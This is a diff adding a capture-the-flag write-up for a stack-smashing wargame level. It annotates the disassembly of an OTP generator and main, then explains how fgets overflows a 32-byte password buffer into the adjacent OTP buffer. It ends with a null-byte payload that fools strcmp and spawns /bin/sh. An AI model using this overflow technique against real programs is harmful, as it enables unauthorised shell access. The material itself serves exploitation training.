@@ -1,0 +1,153 @@
+Generate_OTP function explained:
+
+0x400a36:  push    rbp
+0x400a37:  mov     rbp, rsp
+0x400a3a:  sub     rsp, 0x20                ; stack frame as 0x20 bytes
+0x400a3e:  mov     qword [rbp-0x18], rdi    ; start of the buffer received as argument from main function
+0x400a42:  mov     dword [rbp-0x1c], esi    ; int size of the buffer
+0x400a45:  mov     esi, 0x400d1d            ; very likely "r" read mode on fopen
+0x400a4a:  mov     edi, 0x400d1f  "/dev/urandom" ; file path to open
+0x400a4f:  call    fopen
+0x400a54:  mov     qword [rbp-0x8], rax     ; new var? output from function above
+0x400a58:  mov     eax, dword [rbp-0x1c]
+0x400a5b:  movsxd  rdx, eax
+0x400a5e:  mov     rcx, qword [rbp-0x8]
+0x400a62:  mov     rax, qword [rbp-0x18]
+0x400a66:  mov     esi, 0x1
+0x400a6b:  mov     rdi, rax
+0x400a6e:  call    fread                    ; fread(start of the buffer, 1, size of the buffer, pointer to the file)
+0x400a73:  mov     dword [rbp-0xc], eax     ; output of the fread, bytes read
+0x400a76:  mov     rax, qword [rbp-0x8]     ; pointer of the file, output from the fopen above
+0x400a7a:  mov     rdi, rax
+0x400a7d:  call    fclose                   ; close the fread
+0x400a82:  mov     eax, dword [rbp-0xc]     ; read bytes
+0x400a85:  cmp     eax, dword [rbp-0x1c]    ; COMPARES READ BYTES WITH LENGTH OF THE BUFFER
+0x400a88:  je      0x400a94
+0x400a8a:  mov     edi, 0x1
+0x400a8f:  call    exit                     ; exit(1)
+0x400a94:  mov     dword [rbp-0x10], 0x0    ; neew var, possible counter i=0
+0x400a9b:  jmp     0x400ae9
+0x400a9d:  mov     eax, dword [rbp-0x10]    ; i
+0x400aa0:  movsxd  rdx, eax
+0x400aa3:  mov     rax, qword [rbp-0x18]    ; buffer
+0x400aa7:  lea     rcx, [rdx+rax]           ; buffer[i]
+0x400aab:  mov     eax, dword [rbp-0x10]
+0x400aae:  movsxd  rdx, eax
+0x400ab1:  mov     rax, qword [rbp-0x18]
+0x400ab5:  add     rax, rdx                 ; can this be another buffer[i]
+0x400ab8:  movzx   eax, byte [rax]          ; takes a byte from buffer[i]
+0x400abb:  mov     esi, eax                 ; that byte goes to esi
+0x400abd:  movzx   edx, sil                 ; sil is 8 bits of rsi
+0x400ac1:  mov     eax, edx                 ; 8 bits of rsi goes to eax
+0x400ac3:  shl     eax, 0x2                 ; 8 bits of rsi has left shift of 2
+0x400ac6:  add     eax, edx
+0x400ac8:  shl     eax, 0x4
+0x400acb:  sub     eax, edx
+0x400acd:  shr     ax, 0x8
+0x400ad1:  shr     al, 0x3
+0x400ad4:  mov     edx, 0x1a                ; 26
+0x400ad9:  imul    eax, edx                 ; %
+0x400adc:  sub     esi, eax
+0x400ade:  mov     eax, esi
+0x400ae0:  add     eax, 0x41
+0x400ae3:  mov     byte [rcx], al
+0x400ae5:  add     dword [rbp-0x10], 0x1    ; i+1
+0x400ae9:  mov     eax, dword [rbp-0x10]    ; i
+0x400aec:  cmp     eax, dword [rbp-0x1c]    ; buffer size
+0x400aef:  jl      0x400a9d                 ; this is the condition of the for loop. if(i<buffer_size)
+0x400af1:  mov     eax, dword [rbp-0x1c]
+0x400af4:  cdqe    
+0x400af6:  lea     rdx, [rax-0x1]
+0x400afa:  mov     rax, qword [rbp-0x18]
+0x400afe:  add     rax, rdx
+0x400b01:  mov     byte [rax], 0x0
+0x400b04:  nop     
+0x400b05:  leave   
+0x400b06:  retn    
+
+Main function explained:
+
+0x400b07:  push    rbp
+0x400b08:  mov     rbp, rsp
+0x400b0b:  sub     rsp, 0x50                 ; current stack frame has 80 bytes
+0x400b0f:  mov     rax, qword [fs:0x28]
+0x400b18:  mov     qword [rbp-0x8], rax      ; possible int, char etc..
+0x400b1c:  xor     eax, eax
+0x400b1e:  mov     eax, 0x0
+0x400b23:  call    init_wargame
+0x400b28:  mov     edi, 0x400d30  "--------------------------------…"
+0x400b2d:  call    puts
+0x400b32:  mov     edi, 0x400d70  "--[ Stack Smashing Level #1 - Se…"
+0x400b37:  call    puts
+0x400b3c:  mov     edi, 0x400d30  "--------------------------------…"
+0x400b41:  call    puts
+0x400b46:  mov     qword [rbp-0x50], 0x0     ; 8 * 8 = 64 byte buffer or 2 buffer of 32 or 4 buffers of 16 etc..
+0x400b4e:  mov     qword [rbp-0x48], 0x0
+0x400b56:  mov     qword [rbp-0x40], 0x0
+0x400b5e:  mov     qword [rbp-0x38], 0x0
+0x400b66:  mov     qword [rbp-0x30], 0x0
+0x400b6e:  mov     qword [rbp-0x28], 0x0
+0x400b76:  mov     qword [rbp-0x20], 0x0
+0x400b7e:  mov     qword [rbp-0x18], 0x0
+0x400b86:  lea     rax, [rbp-0x30]           ; possible 2 buffers since this starts from 0x30 to 0x50
+0x400b8a:  mov     esi, 0x20                 ; 32 buffer
+0x400b8f:  mov     rdi, rax
+0x400b92:  call    generate_otp              ; generate_otp(*buffer,32)
+0x400b97:  mov     edi, 0x400dad  "Enter password: "
+0x400b9c:  mov     eax, 0x0
+0x400ba1:  call    printf
+0x400ba6:  mov     rdx, qword [rel stdin]
+0x400bad:  lea     rax, [rbp-0x50]
+0x400bb1:  mov     esi, 0x32
+0x400bb6:  mov     rdi, rax
+0x400bb9:  call    fgets                     ; fgets(*2buffer,50,stdin)
+0x400bbe:  lea     rax, [rbp-0x50]
+0x400bc2:  mov     esi, 0x400dbe
+0x400bc7:  mov     rdi, rax
+0x400bca:  call    strcspn                   ; strcspn(*2buffer, 0x400dbe = \n)
+0x400bcf:  mov     byte [rbp+rax-0x50], 0x0  ; = 0 ?
+0x400bd4:  lea     rax, [rbp-0x50]           ; loads the 2buffer
+0x400bd8:  movzx   eax, byte [rax]
+0x400bdb:  test    al, al
+0x400bdd:  jne     0x400bf3                  ; if (buffer = 0) goes to 0x400bdf
+0x400bdf:  mov     edi, 0x400dc0  "Invalid input..." ; valid checking if
+0x400be4:  call    puts                     ; valid checking if
+0x400be9:  mov     edi, 0x1                 ; valid checking if
+0x400bee:  call    exit                     ; valid checking if
+0x400bf3:  lea     rdx, [rbp-0x30]          ; sucess if. loads buffer 1
+0x400bf7:  lea     rax, [rbp-0x50]          ; loads buffer 2
+0x400bfb:  mov     rsi, rdx
+0x400bfe:  mov     rdi, rax
+0x400c01:  call    strcmp                   ; compares both buffers. strcmp(buffer1,buffer2)
+0x400c06:  test    eax, eax
+0x400c08:  jne     0x400c20                 ; if strcmp=0 go to 0x400c20  (failed case)
+0x400c0a:  mov     edi, 0x400dd1  "Authenticated!"
+0x400c0f:  call    puts
+0x400c14:  mov     edi, 0x400de0  "/bin/sh"
+0x400c19:  call    system
+0x400c1e:  jmp     0x400c2a
+0x400c20:  mov     edi, 0x400de8  "Authentication failed..."
+0x400c25:  call    puts
+0x400c2a:  nop     
+0x400c2b:  mov     rax, qword [rbp-0x8]
+0x400c2f:  xor     rax, qword [fs:0x28]
+0x400c38:  je      0x400c3f
+0x400c3a:  call    __stack_chk_fail
+0x400c3f:  leave   
+0x400c40:  retn    
+
+
+So after some research strcmp stops when it finds a null byte (\x00).
+
+The coder did this => fgets(user_password, 0x32, stdin); 
+
+Problem is that the user_password is 32 bytes. The 0x32 is 50 bytes so 50-32=18 are writable in memory.
+
+To craft out payload we add a random character 'A' + null byte (so strcmp thinks the string is over) + 30 bytes of filler bytes + 'A' again as the first byte of the overwriten buffer + '\x00'
+again so the strcmp thinks it's over.
+
+
+Solution:
+
+p.sendline(b'A\x00XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXA\x00')
+p.sendline(b'A' + b'\x00' + b'X' * 30 + b'A' + b'\x00')
